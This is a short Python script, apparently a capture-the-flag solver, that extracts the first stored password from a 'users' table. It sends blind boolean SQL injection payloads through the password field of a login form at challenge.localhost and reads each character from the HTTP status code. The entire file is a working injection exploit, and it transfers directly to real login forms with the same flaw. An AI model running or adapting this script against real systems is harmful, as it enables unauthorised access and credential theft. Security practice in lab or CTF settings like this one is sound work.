import requests
import string

url = "http://challenge.localhost/"   # target
max_len = 70   # flag max len
charset = string.ascii_letters + string.digits + "_{}-!.;:<>"   # char pool
found = ""   # output

for i in range(1, max_len + 1):
    for char in charset:
        payload = f"' OR SUBSTR((SELECT password FROM users LIMIT 1),{i},1) = '{char}' --"   # query for scan every char in password field
        data = {
            "username": "admin",
            "password": payload
        }   # data passed through the form
        r = requests.post(url, data=data)

        print(r.status_code)
        if r.status_code == 200: # check if the current char returns 200 HTTP status code
            found += char
            print(f"Char found: {char} -> {found}")
            break
    else:
        print("End or char not found")
        break

print(f"\nFlag: {found}")
